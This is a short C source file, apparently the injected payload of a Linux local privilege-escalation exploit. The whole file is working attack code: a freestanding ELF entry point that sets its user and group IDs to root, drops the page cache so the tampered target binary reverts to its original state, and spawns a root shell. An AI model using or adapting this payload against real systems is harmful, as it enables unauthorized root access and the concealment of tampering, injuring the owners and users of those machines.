#define SYS_ERRNO ((int){0}) // dummy lvalue
#include "linux_syscall_support.h"

#define PRINT(msg) sys_write(1, msg, sizeof(msg)-1)

void _start(void)
{
	PRINT("[+] Hello from injected ELF\n");

	if (sys_setresuid(0, 0, 0) || sys_setresgid(0, 0, 0)) {
		PRINT("[-] Failed to elevate to root :(\n");
		sys__exit(-1);
	}

	// drop the caches first, thus restoring the target binary to its original state
	const char *sh_argv[] = {"/bin/sh", "-c", "echo 1 > /proc/sys/vm/drop_caches; sh", NULL};
	sys_execve(sh_argv[0], sh_argv, NULL);

	PRINT("[-] Failed to execve :(\n");
	sys__exit(-1);
}
